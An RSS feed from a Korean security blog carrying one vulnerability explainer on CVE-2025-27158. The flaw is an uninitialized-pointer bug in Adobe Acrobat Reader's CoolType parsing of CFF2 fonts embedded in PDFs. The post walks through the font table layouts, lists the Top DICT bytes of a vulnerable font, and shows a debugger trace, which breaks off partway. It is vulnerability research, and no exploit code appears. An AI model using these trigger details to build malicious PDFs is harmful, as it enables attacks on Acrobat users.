<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 23 Apr 2025 04:51:37 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-27158: Adobe Acrobat Reader의 Uninitialized Pointer로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</link>
      <guid>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</guid>
      <pubDate>Wed, 23 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Adobe Acrobat Reader<ul><li>24.001.30225</li><li>20.005.30748</li><li>25.001.20428 &#xBC0F; &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-27158&#xC740; Adobe Acrobat Reader&#xC5D0;&#xC11C; PDF&#xC5D0; &#xD3EC;&#xD568;&#xB41C; OTF(OpenType Font) &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OTF &#xD30C;&#xC77C;&#xC740; &#xD06C;&#xAC8C; TableDirectory&#xC640; TableRecords&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xBA3C;&#xC800; TableDirectory &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  sfntVersion (<span class="hljs-number">0x00010000</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x74727565</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x4F54544F</span>  )<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>  numTables<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>  searchRange<span class="hljs-number">0x08</span>    <span class="hljs-number">0x02</span>  entrySelector<span class="hljs-number">0x0c</span>    <span class="hljs-number">0x02</span>  rangeShift</code></pre><p>sfntVersion &#xAC12;&#xC774; 0x00010000 &#xB610;&#xB294; 0x74727565&#xC778; &#xACBD;&#xC6B0; &#xAE00;&#xAF34;&#xC5D0; TrueType &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xACE0;, 0x4F54544F&#xC778; &#xACBD;&#xC6B0; CFF &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>numTables&#xB294; TableRecord &#xAC1C;&#xC218;&#xB85C; TableRecord &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- ----------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  tableTag<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>  tableChecksum<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span>  tableOffset<span class="hljs-number">0x0C</span>    <span class="hljs-number">0x04</span>  tableLength</code></pre><p>tableTag&#xC758; &#xAC12;&#xC774; &#x201C;CFF2&#x201D;&#xC774;&#xBA74; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>CFF2(Compact Font Format version 2) &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAD6C;&#xC870;&#xB294; &#xD5E4;&#xB354;, Top DICT, Global Subr INDEX, VariationStore&#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD5E4;&#xB354;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x01</span>  cff2MajorVersion<span class="hljs-number">0x01</span>    <span class="hljs-number">0x01</span>  cfff2MinorVersion<span class="hljs-number">0x02</span>    <span class="hljs-number">0x01</span>  cff2HeaderSize<span class="hljs-number">0x03</span>    <span class="hljs-number">0x02</span>  topDictLength</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; topDictLength&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; Top DICT &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>Top DICT&#xB294; &#xD3F0;&#xD2B8;&#xC758; &#xC8FC;&#xC694; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC740; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Operator Name   Operator Value    Operand type <span class="hljs-keyword">and</span> meaning----------------------------------------------------------------------------------------------------------CharStrings    <span class="hljs-number">0x11</span>               number <span class="hljs-keyword">and</span> it gives CharStrings INDEX offset, from start of the CFF2 table.vstore         <span class="hljs-number">0x18</span>               number <span class="hljs-keyword">and</span> it VariationStore structure offset, from start of the CFF2 table.FDArray        0x0C 0x24          number and it Font DICT (FD) INDEX offset, from start of the CFF2 table.FDSelect       <span class="hljs-number">0x0C</span> <span class="hljs-number">0x25</span>          number <span class="hljs-keyword">and</span> it CharStrings INDEX offset, from start of the CFF2 table. FontMatrix     <span class="hljs-number">0x0c</span> <span class="hljs-number">0x07</span>          <span class="hljs-function"><span class="hljs-built_in">array</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">default</span> value <span class="hljs-title">is</span> <span class="hljs-params">(<span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>)</span></span></code></pre><p>&#xCDE8;&#xC57D;&#xD55C; OTF &#xD30C;&#xC77C;&#xC740; &#xC544;&#xB798; 3&#xAC1C;&#xC758; Top DICT &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">7</span>A <span class="hljs-number">0</span>C <span class="hljs-number">24</span>  ==&gt;  (<span class="hljs-keyword">operator</span>: FDArray, operand after encoding: <span class="hljs-number">0x7A</span>) <span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>A <span class="hljs-number">11</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: CharStrings, operand after encoding: <span class="hljs-number">0x8A</span>)<span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>C <span class="hljs-number">18</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: vstore, operand after encoding: <span class="hljs-number">0x1C</span>)</code></pre><p>&#xC774; &#xC911; vstore(0x18)&#xC758; offset&#xC740; 0x1C&#xB85C; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; 0x1C&#xB9CC;&#xD07C; &#xB5A8;&#xC5B4;&#xC9C4; &#xACF3;&#xC5D0; VariationStore&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"> Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                       Length<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                       Format<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>                       variationRegionListOffset<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>                       itemVariationDataCount (N)<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span> * N                   itemVariationDataOffsets[N]</code></pre><p>itemVariationDataCount&#xB294; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAC1C;&#xC218;(N)&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; itemVariationDataOffsets&#xB294; &#xAC01; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; offset&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>itemVariationData&#xC758; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                      itemCount<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                      shortDeltaCount<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>                      regionIndexCount (C)<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span> * C                  regionIndexes[C]</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; itemVariationDataCount&#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC0AC;&#xC6A9;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C21eax=<span class="hljs-number">00000010</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000004</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28da7 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5877</span>:<span class="hljs-number">6</span>ee28da7 e8b73ee6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;- [<span class="hljs-number">1</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Beax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dac esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb587c</span>:<span class="hljs-number">6</span>ee28dac <span class="hljs-number">66898738020000</span>  mov     word ptr [edi+<span class="hljs-number">238</span>h],ax   ds:<span class="hljs-number">002b</span>:f3a2aba8=ffff &lt;- [<span class="hljs-number">2</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Ceax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db3 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5883</span>:<span class="hljs-number">6</span>ee28db3 <span class="hljs-number">0f</span>b7c0          movzx   eax,ax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pallocate vuln buffer of size <span class="hljs-number">0x20</span>Time Travel Position: E92AE:<span class="hljs-number">1</span>C3Deax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5886</span>:<span class="hljs-number">6</span>ee28db6 c1e004          shl     eax,<span class="hljs-number">4</span>  &lt;- [<span class="hljs-number">3</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Eeax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db9 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5889</span>:<span class="hljs-number">6</span>ee28db9 <span class="hljs-number">50</span>              push    eax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Feax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dba esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588a</span>:<span class="hljs-number">6</span>ee28dba e817cee4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;- [<span class="hljs-number">4</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1394</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dbf esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588f</span>:<span class="hljs-number">6</span>ee28dbf <span class="hljs-number">89873</span>c020000    mov     dword ptr [edi+<span class="hljs-number">23</span>Ch],eax ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">00000000</span>&lt;- [<span class="hljs-number">5</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd eax;                                  &lt;- [<span class="hljs-number">6</span>]<span class="hljs-number">0</span>a02b330  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b350  a0a0a0a0 a0a0a0a0 <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1395</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dc5 esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5895</span>:<span class="hljs-number">6</span>ee28dc5 <span class="hljs-number">0f</span>b78738020000  movzx   eax,word ptr [edi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span></code></pre><p>[1]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x195e3</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; VariationStore &#xAD6C;&#xC870;&#xCCB4; itemVariationDataCount &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. [2]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;(0x02)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x20)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [4]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; malloc&#xC73C;&#xB85C; 0x20 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[6]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; Time Travel Position: E92BA:<span class="hljs-number">1B</span>B5eax=db00d000 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">0000016b</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e65 esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz ac po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000212</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5935</span>:<span class="hljs-number">6</span>ee28e65 e8f93de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">8</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>CFeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6a esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593a</span>:<span class="hljs-number">6</span>ee28e6a <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>D0eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6b esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593b</span>:<span class="hljs-number">6</span>ee28e6b <span class="hljs-number">668906</span>          mov     word ptr [esi],ax        ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b330=e0e0 &lt;-[<span class="hljs-number">9</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>D1eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6e esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593e</span>:<span class="hljs-number">6</span>ee28e6e e8f03de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">10</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db esi L20<span class="hljs-number">0</span>a02b330  <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>a02b340  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>EBeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e73 esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5943</span>:<span class="hljs-number">6</span>ee28e73 <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>ECeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e74 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5944</span>:<span class="hljs-number">6</span>ee28e74 <span class="hljs-number">66894602</span>        mov     word ptr [esi+<span class="hljs-number">2</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b332=e0e0 &lt;-[<span class="hljs-number">11</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>EDeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e78 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5948</span>:<span class="hljs-number">6</span>ee28e78 e8e63de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">12</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C07eax=<span class="hljs-number">00008000</span> ebx=<span 